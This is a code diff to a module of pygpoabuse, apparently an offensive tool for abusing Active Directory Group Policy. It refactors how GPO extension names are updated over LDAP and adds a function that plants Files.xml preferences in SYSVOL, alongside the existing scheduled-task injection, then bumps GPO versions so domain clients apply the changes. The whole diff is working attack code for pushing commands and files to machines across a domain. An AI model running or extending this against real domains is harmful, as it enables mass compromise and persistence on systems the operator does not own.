@@ -2,81 +2,52 @@ import asyncio
 import logging
 import re
 from pygpoabuse.scheduledtask import ScheduledTask
+from pygpoabuse.file import File
 from pygpoabuse.ldap import Ldap
 
 
 class GPO:
-    def __init__(self, smb_session):
+    extension_guids = {
+        'scheduled_task': '{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}',
+        'file': '{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}',
+    }
+    cse_guids = {
+        'scheduled_task': '{AADCED64-746C-4633-A97C-D61349046527}',
+        'file': '{7150F9BF-48AD-4DA4-A49C-29EF4A8369BA}',
+    }
+
+    def __init__(self, smb_session, ldap_url):
         self._smb_session = smb_session
+        self._ldap_url = ldap_url
 
-    def update_extensionNames(self, extensionName):
-        val1 = "00000000-0000-0000-0000-000000000000"
-        val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72"
-        val3 = "AADCED64-746C-4633-A97C-D61349046527"
+    def update_extension_names(self, extension_type, extension_names):
+        # extension format:
+        # [{nullguid}{extension_guid1}{extension_guid2}][{cse_guid1}{extension_guid1}][{cse_guid2}{extension_guid2}]
+        nullguid = "{00000000-0000-0000-0000-000000000000}"
 
-        if extensionName is None:
-            extensionName = ""
+        extension_guid = self.extension_guids[extension_type]
+        cse_guid = self.cse_guids[extension_type]
 
-        try:
-            if not val2 in extensionName:
-                new_values = []
-                toUpdate = ''.join(extensionName)
-                test = toUpdate.split("[")
-                for i in test:
-                    new_values.append(i.replace("{", "").replace("}", " ").replace("]", ""))
+        assignment = f'{cse_guid}{extension_guid}'
 
-                if val1 not in toUpdate:
-                    new_values.append(val1 + " " + val2)
+        if extension_names is None:
+            extension_names = f"[{nullguid}{extension_guid}][{assignment}]"
+            return extension_names
 
-                elif val1 in toUpdate:
-                    for k, v in enumerate(new_values):
-                        if val1 in new_values[k]:
-                            toSort = []
-                            test2 = new_values[k].split()
-                            for f in range(1, len(test2)):
-                                toSort.append(test2[f])
-                            toSort.append(val2)
-                            toSort.sort()
-                            new_values[k] = test2[0]
-                            for val in toSort:
-                                new_values[k] += " " + val
+        if assignment in extension_names:
+            # extension exists
+            return extension_names
 
-                if val3 not in toUpdate:
-                    new_values.append(val3 + " " + val2)
+        extension_list, *assignments = extension_names[1:-1].split('][')
 
-                elif val3 in toUpdate:
-                    for k, v in enumerate(new_values):
-                        if val3 in new_values[k]:
-                            toSort = []
-                            test2 = new_values[k].split()
-                            for f in range(1, len(test2)):
-                                toSort.append(test2[f])
-                            toSort.append(val2)
-                            toSort.sort()
-                            new_values[k] = test2[0]
-                            for val in toSort:
-                                new_values[k] += " " + val
+        extension_list += extension_guid
+        assignments.append(assignment)
 
-                new_values.sort()
+        extension_names = f'[{extension_list}][{ "][".join(assignments) }]'
 
-                new_values2 = []
-                for i in range(len(new_values)):
-                    if new_values[i] is None or new_values[i] == "":
-                        continue
-                    value1 = new_values[i].split()
-                    new_val = ""
-                    for q in range(len(value1)):
-                        if value1[q] is None or value1[q] == "":
-                            continue
-                        new_val += "{" + value1[q] + "}"
-                    new_val = "[" + new_val + "]"
-                    new_values2.append(new_val)
+        return extension_names
 
-                return "".join(new_values2)
-        except:
-            return "[{" + val1 + "}{" + val2 + "}]" + "[{" + val3 + "}{" + val2 + "}]"
-
-    async def update_ldap(self, url, domain, gpo_id, gpo_type="computer"):
+    async def update_ldap(self, url, domain, gpo_id, gpo_type, extension_type):
         ldap = Ldap(url, gpo_id, domain)
         r = await ldap.connect()
         if not r:
@@ -84,31 +55,39 @@ class GPO:
             return False
 
         version = await ldap.get_attribute("versionNumber")
-        
-        if gpo_type == "computer":
+
+        if gpo_type == "Machine":
             attribute_name = "gPCMachineExtensionNames"
             updated_version = version + 1
         else:
             attribute_name = "gPCUserExtensionNames"
             updated_version = version + 65536
 
-        extensionName = await ldap.get_attribute(attribute_name)
+        extension_names = await ldap.get_attribute(attribute_name)
 
-        if extensionName == False:
+        if extension_names is False:
             logging.debug("Could not get {} attribute".format(attribute_name))
             return False
 
-        updated_extensionName = self.update_extensionNames(extensionName)
+        if isinstance(extension_names, list):
+            extension_names = extension_names[0]
 
-        logging.debug("New extensionName: {}".format(updated_extensionName))
+        if extension_names == ' ':
+            extension_names = None
 
-        await ldap.update_attribute(attribute_name, updated_extensionName, extensionName)
+        updated_extension_names = self.update_extension_names(extension_type, extension_names)
+
+        logging.debug("New extensionName: {}".format(updated_extension_names))
+
+        await ldap.update_attribute(attribute_name, updated_extension_names, extension_names)
         await ldap.update_attribute("versionNumber", updated_version, version)
+
+        await ldap.ldap_client.disconnect()
 
         return updated_version
 
-    def update_versions(self, url, domain, gpo_id, gpo_type):
-        updated_version = asyncio.run(self.update_ldap(url, domain, gpo_id, gpo_type))
+    def update_versions(self, domain, gpo_id, gpo_type, extension_type):
+        updated_version = asyncio.run(self.update_ldap(self._ldap_url, domain, gpo_id, gpo_type, extension_type))
 
         if not updated_version:
             return False
@@ -119,14 +98,14 @@ class GPO:
             tid = self._smb_session.connectTree("SYSVOL")
             fid = self._smb_session.openFile(tid, domain + "/Policies/{" + gpo_id + "}/gpt.ini")
             content = self._smb_session.readFile(tid, fid)
-             # Added by @Deft_ to comply with french active directories (mostly accents)
+            # Added by @Deft_ to comply with french active directories (mostly accents)
             try:
                 new_content = re.sub('=[0-9]+', '={}'.format(updated_version), content.decode("utf-8"))
             except UnicodeDecodeError:
                 new_content = re.sub('=[0-9]+', '={}'.format(updated_version), content.decode("latin-1"))
             self._smb_session.writeFile(tid, fid, new_content)
             self._smb_session.closeFile(tid, fid)
-        except:
+        except Exception:
             logging.error("Unable to update gpt.ini file", exc_info=True)
             return False
 
@@ -139,21 +118,21 @@ class GPO:
             try:
                 self._smb_session.listPath("SYSVOL", base_path)
                 logging.debug("{} exists".format(base_path))
-            except:
+            except Exception:
                 try:
                     self._smb_session.createDirectory("SYSVOL", base_path)
                     logging.debug("{} created".format(base_path))
-                except:
+                except Exception:
                     logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                     return False
         return True
 
-    def update_scheduled_task(self, domain, gpo_id, name="", mod_date="", description="", powershell=False, command="", gpo_type="computer", force=False):
+    def update_scheduled_task(self, domain, gpo_id, gpo_type, name="", mod_date="", description="", powershell=False, command="", force=False):
 
         try:
             tid = self._smb_session.connectTree("SYSVOL")
             logging.debug("Connected to SYSVOL")
-        except:
+        except Exception:
             logging.error("Unable to connect to SYSVOL share", exc_info=True)
             return False
 
@@ -166,10 +145,7 @@ class GPO:
             logging.error("GPO id {} does not exist".format(gpo_id), exc_info=True)
             return False
 
-        if gpo_type == "computer":
-            root_path = "Machine"
-        else:
-            root_path = "User"
+        root_path = gpo_type
 
         if not self._check_or_create(path, "{}/Preferences/ScheduledTasks".format(root_path)):
             return False
@@ -179,7 +155,7 @@ class GPO:
         try:
             fid = self._smb_session.openFile(tid, path)
             st_content = self._smb_session.readFile(tid, fid, singleCall=False).decode("utf-8")
-            st = ScheduledTask(gpo_type=gpo_type, name=name, mod_date=mod_date, description=description,
+            st = ScheduledTask(gpo_type, name=name, mod_date=mod_date, description=description,
                                powershell=powershell, command=command, old_value=st_content)
             tasks = st.parse_tasks(st_content)
 
@@ -202,7 +178,7 @@ class GPO:
             except:
                 logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
                 return False
-            st = ScheduledTask(name=name, mod_date=mod_date, description=description, powershell=powershell, command=command)
+            st = ScheduledTask(gpo_type, name=name, mod_date=mod_date, description=description, powershell=powershell, command=command)
             new_content = st.generate_scheduled_task_xml()
 
         try:
@@ -213,4 +189,78 @@ class GPO:
             self._smb_session.closeFile(tid, fid)
             return False
         self._smb_session.closeFile(tid, fid)
-        return st.get_name()
+
+        if self.update_versions(domain, gpo_id, gpo_type, "scheduled_task"):
+            logging.info("Version updated")
+        else:
+            logging.error("Error while updating versions")
+
+        return True
+
+    def update_file(self, domain, gpo_id, gpo_type, source_path, destination_path, mod_date="", force=False):
+
+        try:
+            tid = self._smb_session.connectTree("SYSVOL")
+            logging.debug("Connected to SYSVOL")
+        except:
+            logging.error("Unable to connect to SYSVOL share", exc_info=True)
+            return False
+
+        path = domain + "/Policies/{" + gpo_id + "}/"
+
+        try:
+            self._smb_session.listPath("SYSVOL", path)
+            logging.debug("GPO id {} exists".format(gpo_id))
+        except:
+            logging.error("GPO id {} does not exist".format(gpo_id), exc_info=True)
+            return False
+
+        root_path = gpo_type
+
+        if not self._check_or_create(path, "{}/Preferences/Files".format(root_path)):
+            return False
+
+        path += "{}/Preferences/Files/Files.xml".format(root_path)
+
+        try:
+            fid = self._smb_session.openFile(tid, path)
+            st_content = self._smb_session.readFile(tid, fid, singleCall=False).decode("utf-8")
+            st = File(source_path, destination_path, mod_date=mod_date, old_value=st_content)
+            files = st.parse_files(st_content)
+
+            if not force:
+                logging.error("The GPO already includes a Files.xml.")
+                logging.error("Use -f to append to Files.xml")
+                logging.error("Use -v to display existing tasks")
+                for file in files:
+                    logging.warning(f"src: {file[0]} dst: {file[1]} ")
+                return False
+
+            new_content = st.generate_file_xml()
+        except Exception as e:
+            # File does not exist
+            logging.debug("Files.xml does not exist. Creating it...")
+            try:
+                fid = self._smb_session.createFile(tid, path)
+                logging.debug("Files.xml created")
+            except:
+                logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
+                return False
+            st = File(source_path, destination_path, mod_date=mod_date)
+            new_content = st.generate_file_xml()
+
+        try:
+            self._smb_session.writeFile(tid, fid, new_content)
+            logging.debug("Files.xml has been saved")
+        except:
+            logging.error("This user doesn't seem to have the necessary rights", exc_info=True)
+            self._smb_session.closeFile(tid, fid)
+            return False
+        self._smb_session.closeFile(tid, fid)
+
+        if self.update_versions(domain, gpo_id, gpo_type, "file"):
+            logging.info("Version updated")
+        else:
+            logging.error("Error while updating versions")
+
+        return True
